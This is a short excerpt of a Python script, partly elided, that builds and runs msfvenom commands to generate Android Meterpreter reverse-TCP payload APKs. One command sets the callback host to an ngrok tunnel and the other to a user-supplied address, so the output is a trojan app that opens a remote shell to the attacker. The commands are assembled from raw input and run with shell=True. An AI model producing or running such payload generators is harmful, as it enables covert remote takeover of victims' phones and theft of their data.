...
if use.lower() == 'yes':
    ...
    command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.in.ngrok.io LPORT=" + (a) + " -o" + " "+ (z) + "/" + (b) + ".apk"
    ...
    command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST=" + (c) + " " +"LPORT=" + (d) + " " +  "-o" + " " + (x) +"/" +(e) +".apk"
    subprocess.run(command, shell=True)
